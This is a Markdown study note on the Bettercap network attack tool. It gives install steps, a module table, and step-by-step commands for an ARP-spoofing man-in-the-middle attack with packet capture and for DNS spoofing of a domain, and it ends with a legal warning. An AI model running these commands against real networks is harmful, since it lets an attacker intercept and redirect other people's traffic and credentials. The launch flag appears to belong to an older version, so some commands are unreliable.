## 🛡️ **Bettercap

### 🔷 What is Bettercap?

**Bettercap** is a powerful, flexible, and modular **network attack and monitoring tool** created to perform **Man-In-The-Middle (MITM)** attacks, packet sniffing, real-time manipulation of network traffic, credential harvesting, and more.

It is written in Go and supports:

- Ethernet/Wi-Fi MITM
    
- HTTPS downgrading
    
- DNS spoofing
    
- Network scanning
    
- Packet injection
    
- BLE, HID, and RFID attacks
    

---

## 🧰 Installation

### On Kali Linux (pre-installed in most cases):

```bash
sudo apt update
sudo apt install bettercap -y
```

### Verify:

```bash
bettercap --version
```

---

## ⚙️ Running Bettercap

### Basic command:

```bash
sudo bettercap -I eth0
```

- Replace `eth0` with your actual interface (`ip a` to list interfaces).
    
- Use `wlan0` for Wi-Fi.
    

---

## 💻 Bettercap Interactive Shell

Once inside, the prompt changes to:

```text
bettercap >
```

From here, you can issue module-specific commands.

---

## 🔍 Common Bettercap Modules

|Module|Description|Command|
|---|---|---|
|`net.probe`|Actively scan LAN for live hosts|`net.probe on`|
|`net.show`|Show discovered devices|`net.show`|
|`arp.spoof`|Launch ARP spoofing|`arp.spoof on`|
|`http.proxy`|Intercept and modify HTTP traffic|`http.proxy on`|
|`https.proxy`|MITM HTTPS via SSL stripping (needs setup)|`https.proxy on`|
|`dns.spoof`|Redirect DNS queries|`dns.spoof on`|
|`sniffer`|Capture network packets|`sniffer on`|
|`events.stream`|Show events in real-time|`events.stream on`|

---

## 🎯 Example: Basic MITM Attack with ARP Spoofing

### 1. Start Bettercap:

```bash
sudo bettercap -I eth0
```

### 2. Enable network scanning:

```bash
net.probe on
```

### 3. Show detected hosts:

```bash
net.show
```

### 4. Set a target IP:

```bash
set arp.spoof.targets 192.168.0.105
```

### 5. Start ARP spoofing:

```bash
arp.spoof on
```

### 6. Start sniffer (to capture data):

```bash
set sniffer.output /home/user/sniffed.pcap
sniffer on
```

> You can analyze the `.pcap` file in **Wireshark** later.

---

## 🧪 DNS Spoofing Example

```bash
set dns.spoof.domains example.com
set dns.spoof.address 192.168.0.100
dns.spoof on
```

When the victim browses `example.com`, they are redirected to `192.168.0.100`.

---

## 🛑 Stop & Exit

- To stop a module: `arp.spoof off`
    
- To quit: `exit`
    

---

## 📁 Logs and Output

- Sniffer: Outputs `.pcap` file for Wireshark
    
- Events: Displayed via `events.stream on`
    

---

## ⚠️ Legal Warning

> **Use Bettercap only in environments where you have explicit permission** (e.g., penetration tests with a signed scope). Unauthorized usage is illegal and unethical.

---
## 🏷️ Tags

#Cyber_Security #Kali_Linux #Wifi_Hacking #Buttercap

[[Wi-Fi Hacking]]
